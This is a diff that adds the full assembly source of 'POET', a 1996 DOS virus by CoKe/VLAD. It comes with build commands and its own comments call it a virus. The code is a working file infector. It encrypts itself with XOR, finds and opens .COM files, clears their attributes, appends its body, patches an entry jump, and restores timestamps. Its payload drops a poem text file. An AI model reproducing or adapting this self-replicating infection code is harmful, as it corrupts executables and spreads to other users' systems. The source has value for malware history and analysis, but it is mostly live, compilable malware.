@@ -1,0 +1,247 @@
+; [POET]                      1st April 1996
+; --------------------------------------------------------------------------
+;
+;
+; If you think this is a virus, you're a F00L ! :)
+;
+; Beware, this virus is highly un-polymorphic !  
+;
+; For all those who wanna compile this (Tho I wonder who would.. well)
+;              TASM /M2 POET.ASM and TLINK /t POET.OBJ
+;
+;
+;                                       CoKe / VLAD
+
+.model tiny
+.code
+
+org 100h                                
+
+tof:    jmp begin
+        nop
+        db 26
+
+four_b: nop
+address:int 20h
+check:  nop
+
+begin:  call next
+
+next:   pop bp
+        sub bp, offset(next)
+        
+        call enc_dec
+        jmp domain
+        
+enc_val dw 0h
+
+enc_dec:
+        mov dx, word ptr[bp + enc_val] 
+        lea si, [bp + offset(domain)]
+        mov cx, (ende - domain + 1) /2
+
+xor_it: xor word ptr[si], dx
+        add si, 2
+        loop xor_it
+        ret
+
+writev:
+        mov ah, 2Ch
+        int 21h
+        mov word ptr[bp + enc_val], dx
+
+        call enc_dec
+        
+        mov ah, 40h
+        mov cx, offset(ende) - offset(begin)
+        lea dx, [bp + offset(begin)]
+        int 21h
+        
+        call enc_dec
+        ret
+
+domain: lea si, [bp + offset(four_b)]
+        mov di, offset(tof)
+        mov cx, 4
+        cld
+        rep movsb
+        
+        mov ah, 1Ah
+        lea dx, [bp + offset(DTA)]
+        int 21h
+
+        mov ah, 4Eh                     
+        lea dx, [bp + offset(filesp)]   
+        lea si, [bp + offset(filename)] 
+        int 21h                         
+        push dx                         
+        push si                         
+        jnc ok                          
+        jmp error                       
+
+f_next: pop dx                          
+        pop si                          
+        pop bx                          
+        or bx, bx                       
+        jz goon                         
+        mov ah, 3Eh                     
+        int 21h                         
+goon:   mov ah, 4Fh                     
+        int 21h                         
+        push dx                         
+        push si                         
+        jnc ok                          
+
+error:  mov ah, 3Eh                     
+        int 21h                         
+        jmp party
+
+ok:     mov ax, 4301h                   
+        xor cx, cx                      
+        mov dx, si                      
+        int 21h                         
+
+        mov ax, 3D02h                   
+        mov dx, si                      
+        int 21h                         
+        mov bx, ax                      
+        push bx                         
+        jc error                        
+                
+        mov ah, 3Fh                     
+        mov cx, 4                       
+        lea dx, [bp + offset(four_b)]   
+        int 21h                         
+
+        cmp byte ptr [bp + offset(check)], 26
+        je f_next                            
+
+        mov ax, 4202h                  
+        xor dx, dx                     
+        xor cx, cx                     
+        int 21h                        
+        mov [bp + offset(addr)], ax    
+        cmp ax, 0000FA00h               
+        ja f_next                       
+        mov ax, [bp + offset(DTA) + 35] 
+        cmp ax, 'DN'                    
+        jz f_next                       
+
+
+        mov ah, 40h                     
+        mov cx, 4                       
+        lea dx, [bp + offset(four_b)]   
+        int 21h                         
+
+        call writev                     
+        
+        mov ax, 4200h                   
+        xor dx, dx                      
+        xor cx, cx                      
+        int 21h                         
+        
+        mov ax, [bp + offset(addr)]     
+        inc ax                          
+        
+        mov [bp + offset(address)], ax  
+        mov byte ptr [bp + offset(four_b)], 0E9h
+        mov byte ptr [bp + offset(check)], 26
+
+        mov ah, 40h                     
+        mov cx, 4                       
+        lea dx, [bp + offset(four_b)]   
+        int 21h                         
+        
+        mov ax, 5701h                   
+        mov dx, word ptr [bp + f_date]  
+        mov cx, word ptr [bp + f_time]  
+        int 21h                         
+        
+        mov ah, 3Eh                     
+        int 21h                         
+        
+        mov ax, 4301h                   
+        lea dx, [bp + offset DTA + 1eh] 
+        xor ch,ch                       
+        mov cl, byte ptr [bp + attribute]
+        int 21h                        
+
+party:
+        in al, 40h
+        and al, 00000111b
+        add al, 48
+        xchg ah, al
+        in al, 40h
+        and al, 00000111b
+        add al, 48
+        mov word ptr [bp + offset poetcrap], ax
+        xchg ah, al
+        mov word ptr [bp + offset poetcrap + 2], ax
+
+        mov ah, 3ch
+        lea dx, [bp + offset poetfile]
+        int 21h
+
+        jc endthis
+
+        xchg ax, bx
+
+        mov ah, 40h
+        mov cx, (ende - poem)                       
+        lea dx, [bp + offset poem]   
+        int 21h                         
+
+        mov ah, 3eh                     
+        int 21h                         
+
+endthis:mov ah, 1Ah                     
+        mov dx, 80h                     
+        int 21h                         
+        mov sp, 0FFFEh                  
+        mov bp, 100h                    
+        push bp                         
+        xor bp, bp                      
+        ret                             ;return (JMP 100h)
+
+filesp db '*.com' ,0
+poetfile db 'poem'
+poetcrap dw 0,0
+morecrap db '.txt',0
+poem    db '_Darkness_', 0ah, 0dh
+        db 'All alone', 0ah, 0dh
+        db 'hiding in the dark', 0ah, 0dh
+        db ' the shadows', 0ah, 0dh
+        db '  of the past', 0ah, 0dh
+        db '    haunting me', 0ah, 0dh
+        db '     scaring me.', 0ah, 0dh
+        db 'Visions of You floating ', 0ah, 0dh
+        db ' through the room', 0ah, 0dh
+        db '  though my soul.', 0ah, 0dh
+        db 'Can''t escape this pain', 0ah, 0dh
+        db ' these thoughts', 0ah, 0dh
+        db '  longing for your arms', 0ah, 0dh
+        db '   your tender words', 0ah, 0dh
+        db '    your sweet kisses.', 0ah, 0dh
+        db 'You went away from me', 0ah, 0dh
+        db ' two hearts one soul', 0ah, 0dh
+        db '  ripped apart ', 0ah, 0dh
+        db '   leaving nothing but', 0ah, 0dh
+        db '    a broken heart.', 0ah, 0dh
+        db 'Whatever you do', 0ah, 0dh
+        db ' wherever you are', 0ah, 0dh
+        db '  close or far', 0ah, 0dh
+        db '   never forget', 0ah, 0dh
+        db '    I love you', 0ah, 0dh
+        db '     as you are.',0
+
+ende:
+
+DTA db 21 dup(?)
+attribute db ?
+f_time db 2 dup (?)
+f_date db 2 dup (?)
+f_size db 4 dup (?)
+filename db 13 dup (?)
+addr db 4 dup (?)
+
+end tof
